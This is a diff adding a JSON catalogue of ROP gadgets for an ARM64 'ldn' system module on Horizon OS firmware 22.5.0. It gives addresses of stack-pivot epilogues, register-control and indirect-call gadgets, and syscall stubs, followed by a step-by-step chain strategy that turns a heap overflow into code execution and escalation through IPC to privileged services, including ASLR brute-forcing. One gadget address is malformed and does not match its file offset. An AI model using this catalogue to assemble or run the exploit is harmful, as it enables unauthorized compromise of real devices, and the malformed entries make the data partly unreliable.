@@ -1,0 +1,499 @@
+{
+  "title": "ldn Sysmodule ROP Gadget Catalog — ARM64",
+  "binary": "main.flat.bin",
+  "binary_sha256": "91bee792da7c8ca7718bac166009331cd14ecdcc662c9fcf52f435da0d56f34a",
+  "firmware": "22.5.0",
+  "architecture": "AARCH64:LE:64:v8A",
+  "base_address": "0x7100000000",
+  "date": "2026-11-23",
+
+  "notes": {
+    "aslr": "17-bit entropy, 2MB-aligned. All addresses below are base-relative (subtract 0x7100000000 to get file offset). At runtime, add the actual module base.",
+    "mitigations": "NX enabled (need ROP), no PAC, no stack canaries on Erista",
+    "search_coverage": "Full binary (961288 bytes) searched for each pattern"
+  },
+
+  "gadgets": {
+
+    "stack_pivot_epilogues": {
+      "description": "ldp x29, x30, [sp], #N; ret — restore frame pointer + return address from stack, advance SP, return. These are the backbone of any ROP chain.",
+      "frame_0x20": {
+        "pattern": "fd7bc2a8 c0035fd6",
+        "instruction": "ldp x29, x30, [sp], #0x20; ret",
+        "frame_size": 32,
+        "count": "20+ matches (search incomplete, first page only)",
+        "best_examples": [
+          {
+            "address": "0x7100000130",
+            "file_offset": 304,
+            "procedure": "FUN_7100000100",
+            "note": "Simple epilogue, early in binary"
+          },
+          {
+            "address": "0x710000028d8",
+            "file_offset": 10456,
+            "procedure": "FUN_71000028b0"
+          },
+          {
+            "address": "0x7100003d94",
+            "file_offset": 15764,
+            "procedure": "FUN_7100003d60"
+          }
+        ]
+      },
+      "frame_0x40": {
+        "pattern": "fd7bc4a8 c0035fd6",
+        "instruction": "ldp x29, x30, [sp], #0x40; ret",
+        "frame_size": 64,
+        "count": "20+ matches",
+        "best_examples": [
+          {
+            "address": "0x710000af88",
+            "file_offset": 44936,
+            "procedure": "FUN_710000aee0"
+          },
+          {
+            "address": "0x7100007b90",
+            "file_offset": 31632,
+            "procedure": "FUN_7100007ac0"
+          }
+        ]
+      },
+      "frame_0x60": {
+        "pattern": "fd7bc6a8 c0035fd6",
+        "instruction": "ldp x29, x30, [sp], #0x60; ret",
+        "frame_size": 96,
+        "count": "20+ matches",
+        "best_examples": [
+          {
+            "address": "0x7100005794",
+            "file_offset": 22420,
+            "procedure": "FUN_7100005590"
+          },
+          {
+            "address": "0x710003a368",
+            "file_offset": 238440,
+            "procedure": "FUN_71000398b0"
+          },
+          {
+            "address": "0x710003c520",
+            "file_offset": 247072,
+            "procedure": "FUN_710003bf40"
+          }
+        ]
+      }
+    },
+
+    "register_control_epilogues": {
+      "description": "Multi-register ldp sequences before the stack pivot + ret. These load callee-saved registers from the stack, giving full register control for subsequent gadgets.",
+
+      "x19_x20_control_0x20": {
+        "address": "0x71000014ac",
+        "file_offset": 5292,
+        "procedure": "FUN_7100001470",
+        "instructions": [
+          "ldp x20, x19, [sp, #0x10]",
+          "ldp x29, x30, [sp], #0x20",
+          "ret"
+        ],
+        "registers_controlled": ["x19", "x20"],
+        "stack_layout": {
+          "sp+0x00": "x29 (frame pointer)",
+          "sp+0x08": "x30 (return address → next gadget)",
+          "sp+0x10": "x20",
+          "sp+0x18": "x19"
+        },
+        "frame_size": 32
+      },
+
+      "x19_x23_control_0x40": {
+        "address": "0x710000af78",
+        "file_offset": 44920,
+        "procedure": "FUN_710000aee0",
+        "instructions": [
+          "mov w0, w20",
+          "ldp x20, x19, [sp, #0x30]",
+          "ldp x22, x21, [sp, #0x20]",
+          "ldr x23, [sp, #0x10]",
+          "ldp x29, x30, [sp], #0x40",
+          "ret"
+        ],
+        "registers_controlled": ["x19", "x20", "x21", "x22", "x23"],
+        "side_effect": "w0 = w20 (sets return value from stack-controlled x20)",
+        "stack_layout": {
+          "sp+0x00": "x29",
+          "sp+0x08": "x30 (next gadget)",
+          "sp+0x10": "x23",
+          "sp+0x20": "x22",
+          "sp+0x28": "x21",
+          "sp+0x30": "x20",
+          "sp+0x38": "x19"
+        },
+        "frame_size": 64,
+        "note": "BEST x0-setter: sets w0=w20 before return, x20 loaded from sp+0x30"
+      },
+
+      "x19_x28_control_0x60_full": {
+        "address": "0x7100011f20",
+        "file_offset": 73504,
+        "procedure": "FUN_7100011810",
+        "instructions": [
+          "ldp x20, x19, [sp, #0x50]",
+          "ldp x22, x21, [sp, #0x40]",
+          "ldp x24, x23, [sp, #0x30]",
+          "ldp x26, x25, [sp, #0x20]",
+          "ldp x28, x27, [sp, #0x10]",
+          "ldp x29, x30, [sp], #0x60",
+          "ret"
+        ],
+        "registers_controlled": ["x19", "x20", "x21", "x22", "x23", "x24", "x25", "x26", "x27", "x28"],
+        "stack_layout": {
+          "sp+0x00": "x29",
+          "sp+0x08": "x30 (next gadget)",
+          "sp+0x10": "x28",
+          "sp+0x18": "x27",
+          "sp+0x20": "x26",
+          "sp+0x28": "x25",
+          "sp+0x30": "x24",
+          "sp+0x38": "x23",
+          "sp+0x40": "x22",
+          "sp+0x48": "x21",
+          "sp+0x50": "x20",
+          "sp+0x58": "x19"
+        },
+        "frame_size": 96,
+        "note": "MASTER GADGET: controls ALL callee-saved registers x19-x28 from stack"
+      },
+
+      "x21_x28_control_0x60": {
+        "address": "0x710003c510",
+        "file_offset": 247056,
+        "procedure": "FUN_710003bf40",
+        "instructions": [
+          "ldp x22, x21, [sp, #0x40]",
+          "ldp x24, x23, [sp, #0x30]",
+          "ldp x26, x25, [sp, #0x20]",
+          "ldp x28, x27, [sp, #0x10]",
+          "ldp x29, x30, [sp], #0x60",
+          "ret"
+        ],
+        "registers_controlled": ["x21", "x22", "x23", "x24", "x25", "x26", "x27", "x28"],
+        "frame_size": 96
+      },
+
+      "x23_x28_control_0x60": {
+        "address": "0x71000382a0",
+        "file_offset": 230048,
+        "procedure": "FUN_7100037dc0",
+        "instructions": [
+          "ldp x24, x23, [sp, #0x30]",
+          "ldp x26, x25, [sp, #0x20]",
+          "ldp x28, x27, [sp, #0x10]",
+          "ldp x29, x30, [sp], #0x60",
+          "ret"
+        ],
+        "registers_controlled": ["x23", "x24", "x25", "x26", "x27", "x28"],
+        "frame_size": 96,
+        "note": "In the vulnerable consumer function FUN_7100037dc0 — directly reachable from overflow"
+      },
+
+      "x19_x28_control_with_sp_adjust": {
+        "address": "0x710003a354",
+        "file_offset": 238420,
+        "procedure": "FUN_71000398b0",
+        "instructions": [
+          "ldp x20, x19, [sp, #0x50]",
+          "ldp x22, x21, [sp, #0x40]",
+          "ldp x24, x23, [sp, #0x30]",
+          "ldp x26, x25, [sp, #0x20]",
+          "ldp x28, x27, [sp, #0x10]",
+          "ldp x29, x30, [sp], #0x60",
+          "ret"
+        ],
+        "registers_controlled": ["x19", "x20", "x21", "x22", "x23", "x24", "x25", "x26", "x27", "x28"],
+        "frame_size": 96,
+        "note": "Preceded by add sp, sp, #N — additional SP adjustment before register restore"
+      }
+    },
+
+    "indirect_call_gadgets": {
+      "description": "blr xN — branch to register with link. Used to call arbitrary functions after register setup.",
+
+      "blr_x8": {
+        "pattern": "00013fd6",
+        "instruction": "blr x8",
+        "count": "15+ matches (first page only)",
+        "best_examples": [
+          {
+            "address": "0x71000014a4",
+            "file_offset": 5284,
+            "procedure": "FUN_7100001470",
+            "context_before": "cbz x8, skip; blr x8",
+            "note": "Preceded by cbz x8 — skips call if x8=0 (safe). After call: branch back, then ldp x20,x19; ldp x29,x30; ret"
+          },
+          {
+            "address": "0x71000017e8",
+            "file_offset": 6120,
+            "procedure": "FUN_71000016d0"
+          },
+          {
+            "address": "0x7100001808",
+            "file_offset": 6152,
+            "procedure": "FUN_71000016d0"
+          },
+          {
+            "address": "0x710000197c",
+            "file_offset": 6524,
+            "procedure": "FUN_71000016d0"
+          },
+          {
+            "address": "0x71000027c8",
+            "file_offset": 10184,
+            "procedure": "FUN_7100002770"
+          },
+          {
+            "address": "0x7100002828",
+            "file_offset": 10280,
+            "procedure": "FUN_71000027f0"
+          }
+        ],
+        "note": "x8 is the standard indirect call register in ARM64 ABI. Control via register_control_epilogues (x8 not callee-saved — need a load gadget or use as part of a function's prologue)"
+      },
+
+      "blr_x1": {
+        "pattern": "20003fd6",
+        "instruction": "blr x1",
+        "count": 3,
+        "examples": [
+          {
+            "address": "0x71000000bc",
+            "file_offset": 188,
+            "procedure": "FUN_710000000c",
+            "note": "In startup code"
+          },
+          {
+            "address": "0x710000114c",
+            "file_offset": 4428,
+            "procedure": "FUN_7100000fe0"
+          },
+          {
+            "address": "0x7100009658",
+            "file_offset": 38488,
+            "procedure": "FUN_710000927c"
+          }
+        ]
+      }
+    },
+
+    "svc_stubs": {
+      "description": "Horizon OS system call stubs. These are the actual SVC instruction wrappers in the SDK. Addresses are for direct calls from ROP.",
+      "stub_area": "0x7100023d40 — 0x7100023e00 (SVC stub table)",
+      "stubs": {
+        "svcWaitSynchronization": {
+          "address": "0x7100023d40",
+          "svc_number": "0x18",
+          "encoding": "010300d4",
+          "wrapper": "SVC #0x18; ldr x2,[sp]; str w1,[x2]; add sp,sp,#0x10; ret",
+          "wrapper_size": 20,
+          "note": "Returns result via stack pointer; multi-instruction wrapper"
+        },
+        "svcCancelSynchronization": {
+          "address": "0x7100023d54",
+          "svc_number": "0x19",
+          "encoding": "210300d4",
+          "wrapper": "SVC #0x19; ret",
+          "wrapper_size": 8
+        },
+        "svcArbitrateLock": {
+          "address": "0x7100023d5c",
+          "svc_number": "0x1A",
+          "encoding": "410300d4",
+          "wrapper": "SVC #0x1A; ret",
+          "wrapper_size": 8
+        },
+        "svcArbitrateUnlock": {
+          "address": "0x7100023d64",
+          "svc_number": "0x1B",
+          "encoding": "610300d4",
+          "wrapper": "SVC #0x1B; ret",
+          "wrapper_size": 8
+        },
+        "svcWaitProcessWideKeyAtomic": {
+          "address": "0x7100023d6c",
+          "svc_number": "0x1C",
+          "encoding": "810300d4",
+          "wrapper": "SVC #0x1C; ret",
+          "wrapper_size": 8
+        },
+        "svcSignalProcessWideKey": {
+          "address": "0x7100023d74",
+          "svc_number": "0x1D",
+          "encoding": "a10300d4",
+          "wrapper": "SVC #0x1D; ret",
+          "wrapper_size": 8
+        },
+        "svcConnectToNamedPort": {
+          "address": "0x7100023d7c",
+          "svc_number": "0x1F",
+          "encoding": "e10300d4",
+          "wrapper_size": 20,
+          "note": "Multi-instruction wrapper with stack save; CRITICAL for IPC"
+        },
+        "svcSendSyncRequest": {
+          "address": "0x7100023d94",
+          "svc_number": "0x21",
+          "encoding": "210400d4",
+          "wrapper": "SVC #0x21; ret",
+          "wrapper_size": 8,
+          "note": "CRITICAL: core IPC mechanism for all service calls"
+        },
+        "svcSendSyncRequestWithUserBuffer": {
+          "address": "0x7100023d9c",
+          "svc_number": "0x22",
+          "encoding": "410400d4",
+          "wrapper": "SVC #0x22; ret",
+          "wrapper_size": 8
+        },
+        "svcCreateEvent": {
+          "address": "0x7100023da4",
+          "svc_number": "0x25",
+          "encoding": "a10400d4",
+          "wrapper_size": 20
+        },
+        "svcOutputDebugString": {
+          "address": "0x7100023dc4",
+          "svc_number": "0x27",
+          "encoding": "e10400d4",
+          "wrapper": "SVC #0x27; ret",
+          "wrapper_size": 8,
+          "note": "Useful for debugging exploit — write strings to kernel log"
+        },
+        "svcGetInfo": {
+          "address": "0x7100023ddc",
+          "svc_number": "0x29",
+          "encoding": "210500d4",
+          "wrapper_size": 20,
+          "note": "Returns system info; can leak ASLR base via InfoType"
+        },
+        "svcCreateTransferMemory": {
+          "address": "0x7100023df0",
+          "svc_number": "0x35",
+          "encoding": "a10600d4",
+          "wrapper": "SVC #0x35; ret",
+          "wrapper_size": 8
+        },
+        "svcFlushProcessDataCache": {
+          "address": "0x7100023df8",
+          "svc_number": "0x36",
+          "encoding": "c10600d4",
+          "wrapper": "SVC #0x36; ret",
+          "wrapper_size": 8
+        }
+      }
+    },
+
+    "mov_x0_gadgets": {
+      "description": "Gadgets that set x0 (first argument / return value) from a stack-controlled register. No direct mov-ret pairs found; all go through epilogue register restores.",
+      "mov_x0_x19": {
+        "pattern": "e00313aa",
+        "instruction": "mov x0, x19",
+        "count": "10+ matches (search incomplete)",
+        "note": "Very common. Chain: use register_control to set x19, then jump to this, x0 gets x19's value. Always followed by more instructions before ret."
+      },
+      "mov_x0_x20": {
+        "pattern": "e00314aa",
+        "instruction": "mov x0, x20",
+        "count": "10+ matches",
+        "note": "Common pattern in virtual dispatch sequences"
+      },
+      "mov_x0_x21": {
+        "pattern": "e00315aa",
+        "instruction": "mov x0, x21",
+        "count": "10+ matches"
+      },
+      "mov_w0_w20_with_epilogue": {
+        "address": "0x710000af78",
+        "instruction_sequence": "mov w0, w20; ldp x20,x19,[sp,#0x30]; ldp x22,x21,[sp,#0x20]; ldr x23,[sp,#0x10]; ldp x29,x30,[sp],#0x40; ret",
+        "note": "BEST: sets w0 from w20 AND restores x19-x23, all from stack. Single gadget for x0 control + chain continuation."
+      }
+    },
+
+    "function_targets": {
+      "description": "Key functions to call from ROP chain for exploitation",
+      "memcpy": {
+        "note": "thunk_FUN_71000a8540 — the same memcpy used by the vulnerable function",
+        "address": "0x71000a8540",
+        "usage": "memcpy(dst, src, len) — for writing controlled data to arbitrary addresses"
+      },
+      "vulnerable_function": {
+        "address": "0x710003b470",
+        "name": "FUN_710003b470",
+        "note": "The vulnerable frame extractor itself — could be re-triggered"
+      },
+      "recv_action_frame": {
+        "address": "0x7100036bb0",
+        "name": "FUN_7100036bb0",
+        "note": "Frame receive loop"
+      },
+      "consumer_loop": {
+        "address": "0x7100037dc0",
+        "name": "FUN_7100037dc0",
+        "note": "Main frame processing — where overflow occurs during normal execution"
+      }
+    }
+  },
+
+  "rop_chain_strategy": {
+    "overview": "The heap overflow at FUN_710003b470 corrupts adjacent heap data. The chain requires: (1) hijack control flow via corrupted vtable/function pointer, (2) pivot stack to controlled data, (3) execute ROP chain to call svcSendSyncRequest for IPC, escalating to code execution.",
+
+    "step_1_hijack": {
+      "description": "Corrupt a vtable pointer or function pointer on the heap adjacent to the overflowed output struct (0x798 bytes each in an array)",
+      "targets": [
+        "Adjacent output struct's vtable pointer (at struct+0x00)",
+        "Ring buffer metadata",
+        "Heap allocator metadata (free list corruption)"
+      ]
+    },
+
+    "step_2_stack_pivot": {
+      "description": "Need to pivot SP to attacker-controlled data. Options:",
+      "option_a": "If we control a vtable, point it at a function that does `add sp, xN, #imm` or `mov sp, xN` where xN is controlled",
+      "option_b": "Corrupt return address on actual stack via adjacent stack frame corruption",
+      "option_c": "Use `ldp x29, x30, [sp], #N; ret` chain starting from corrupted heap metadata that affects stack operations"
+    },
+
+    "step_3_register_setup": {
+      "description": "Use master gadget at 0x7100011f20 to control x19-x28, then chain to mov-x0 gadget",
+      "gadget_chain": [
+        "0x7100011f20: load x19-x28 from stack",
+        "0x710000af78: mov w0, w20 + restore + ret (sets first argument)",
+        "Target function call or SVC wrapper"
+      ]
+    },
+
+    "step_4_svc_call": {
+      "description": "Call svcSendSyncRequest (0x7100023d94) or svcConnectToNamedPort (0x7100023d7c) for IPC to other services",
+      "escalation_path": [
+        "Connect to sm: (service manager) via svcConnectToNamedPort",
+        "Request handles to privileged services",
+        "Use IPC to load custom NRO/NSO or modify memory mappings"
+      ]
+    },
+
+    "aslr_considerations": {
+      "entropy": "17-bit, 2MB-aligned",
+      "brute_force": "~65K average attempts via repeated frame injection",
+      "info_leak_alternative": "svcGetInfo (0x7100023ddc) can return module base if called with right InfoType — but requires initial code execution first",
+      "partial_overwrite": "If heap layout allows, partial pointer overwrite (1-2 bytes) may bypass ASLR for nearby targets"
+    }
+  },
+
+  "summary": {
+    "total_epilogue_gadgets": "60+ (across 3 frame sizes)",
+    "register_control": "Full x19-x28 control from stack (master gadget at 0x7100011f20)",
+    "x0_setter": "mov w0, w20 at 0x710000af78 (with full epilogue)",
+    "blr_gadgets": "15+ blr x8, 3x blr x1",
+    "svc_stubs": "15+ HOS SVCs mapped (svcSendSyncRequest, svcConnectToNamedPort, svcGetInfo, etc.)",
+    "assessment": "SUFFICIENT gadgets for full ROP chain. The binary provides all primitives needed: register control, indirect calls, syscall stubs, and stack frame management. The main challenge is the initial control flow hijack from heap overflow and ASLR bypass."
+  }
+}
